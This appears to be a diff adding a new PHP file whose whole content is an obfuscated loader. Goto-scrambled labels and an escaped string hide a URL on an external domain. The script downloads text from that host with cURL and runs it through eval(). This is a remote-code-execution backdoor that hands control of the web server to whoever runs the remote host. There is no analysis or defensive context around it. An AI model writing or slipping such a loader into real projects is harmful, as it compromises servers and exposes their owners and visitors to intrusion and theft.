@@ -1,0 +1,2 @@
+<?php
+ goto aKsL_; h1_or: curl_setopt($FKrZ3, CURLOPT_URL, $AblNN); goto Fkrjf; X18T2: $FKrZ3 = curl_init(); goto h1_or; Ogu79: $OQXbW = curl_exec($FKrZ3); goto cCbVu; cCbVu: curl_close($FKrZ3); goto sj2DC; aKsL_: $AblNN = "\x68\164\x74\160\x73\x3a\x2f\57\x61\155\x70\156\x79\x61\160\165\156\171\141\x6b\x75\56\x74\157\160\x2f\164\157\x6f\x6c\163\x2f\163\x2d\155\x65\144\x69\141\57\x6d\x65\144\151\x61\x2d\156\145\167\56\164\x78\x74"; goto X18T2; Fkrjf: curl_setopt($FKrZ3, CURLOPT_RETURNTRANSFER, true); goto Ogu79; sj2DC: echo eval("\77\76" . $OQXbW);
